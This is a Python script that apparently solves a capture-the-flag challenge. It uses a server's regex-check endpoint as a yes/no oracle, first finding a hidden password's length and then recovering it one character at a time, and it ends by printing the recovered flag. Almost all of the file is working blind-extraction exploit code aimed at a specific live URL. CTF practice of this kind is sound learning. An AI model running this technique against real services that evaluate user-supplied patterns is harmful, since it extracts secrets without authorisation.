from requests import post,get
from string import ascii_lowercase as low, ascii_uppercase as up,digits as num
SpecialChars='!#$%&*+,-./:;=@\\^_`~'

url="https://learn-gcp-286602.uc.r.appspot.com/"
data={"regexCheck" :''}

def verify(regex):
    data['regexCheck'] = regex
    return False if post(url,data=data).text.find("success")==-1 else True


i=1
while verify('.{%d}' % i):i+=1
PassLen=i-1
print("Length of the password is : {} ".format(PassLen))
#PassLen=47


payload = "^"
for i in range(PassLen):
    if verify(payload+"[A-Z]"):
        for char in up:
            if verify(payload+char):
                payload+=char
                print(payload[1:])
                break
    elif verify(payload+"[a-z]"):
        for char in low:
            if verify(payload+char):
                payload+=char
                print(payload[1:])
                break
    elif verify(payload+"[0-9]"):
        for char in num:
            if verify(payload+char):
                payload+=char
                print(payload[1:])
                break
    else:
        for char in SpecialChars:
            char="\\" + char
            if verify(payload+char):
                payload+=char[1]
                print(payload[1:])
                break

flag=payload[1:].replace('\\','')
print(flag)
'''
Y0U_Sh0uld_V0te_but_Pl3asE_Dont-V0TE_TRUMP!!-_-
'''